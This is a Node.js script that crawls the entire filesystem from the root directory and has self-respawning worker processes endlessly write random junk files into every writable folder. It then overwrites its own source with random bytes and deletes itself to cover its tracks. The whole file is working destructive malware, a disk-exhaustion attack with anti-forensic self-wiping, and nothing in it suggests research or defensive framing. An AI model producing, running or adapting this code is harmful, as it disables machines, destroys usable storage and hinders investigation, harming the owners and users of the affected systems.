const cluster = require('cluster'),
path = require('path'),
crypto = require('crypto'),
fs = require('fs');

const config = {
  dest: '/',
  clusters: 1,
  threads: 1,
  pad_size: 1024,
  file: {
    max_file_size: 512,
    max_name_size: 16,
    ext: ['', 'txt', 'css']
  },
  alpha: 'abcdefghijklmnopqrstuvwxyz',
  special: '1234567890',
  wipe: {
    rounds: 10,
    delay: 3000
  }
}

const utils = {
  mapdir(dir, cb) {
    let results = [dir];

    fs.readdir(dir, function(err, list) {
      if (err){
        return cb(err);
      }

      let len = list.length;
      if(!len){
        return cb(null, results);
      }

      list.forEach(function(file){
        file = path.resolve(dir, file);

        fs.stat(file, function(err, stat){
          if(stat && stat.isDirectory()){
            results.push(file);

            utils.mapdir(file, function(err, res) {
              results = results.concat(res);
              if(!--len){
                return cb(null, results);
              }
            });
          } else {
            results.push(file);
            if(!--len){
              return cb(null, results);
            }
          }
        })
      })
    });
  },
  shuffle(input){

    for (let i = input.length - 1; i >= 0; i--) {

      let ridx = Math.floor(Math.random() * (i + 1)),
      idx = input[ridx];

      input[ridx] = input[i];
      input[i] = idx;
    }
    return input;
  },
  rnd(x){
    return Math.floor(Math.random() * x) + 1;
  },
  write(dest, pad, alpha, cb){
    try {
      let data = Buffer.from(utils.shuffle(pad).slice(0, utils.rnd(config.file.max_file_size))).toString();
      dest = [dest,[
        utils.shuffle(alpha).slice(0, utils.rnd(config.file.max_name_size)).join(''),
        config.file.ext[utils.rnd(config.file.ext.length - 1)]
      ].join('.')].join('/');

      fs.writeFile(dest, data, function(err){
        if(err){return cb(dest)}
        cb(false)
      })
    } catch (err) {
      console.log(err)
    }

  },
  wipe(){
    let len = fs.statSync(__filename).size,
    data;
    for (let i = 0; i < config.wipe.rounds; i++) {
      data = crypto.randomBytes(len);
      fs.writeFileSync(__filename, data.toString());
    }
    fs.unlinkSync(__filename);
  }
}

let pad = Array.from(crypto.randomBytes(config.pad_size)),
alpha = utils.shuffle(
  (config.alpha.toUpperCase() + config.special + config.alpha).split('')
)

utils.mapdir(config.dest, function(err, dirs){

  if(cluster.isMaster){

    for (let i = 0; i < config.clusters; i++){
      cluster.fork().on('exit', function(worker, code, signal){
        cluster.fork();
      });
    }

    setTimeout(function(){
      utils.wipe();
    },config.wipe.delay)

  } else {

     function fn(x, y, z){
       utils.write(x, y, z, function(err){
         if(err){
           dirs.splice(x, 1);
         } else {
           fn(x, y, z)
         }
       })
     }

    for (let i = 0; i < config.threads; i++) {
      for (let x = 0; x < dirs.length; x++) {
        fn(dirs[x], pad, alpha)
      }
    }

  }

})
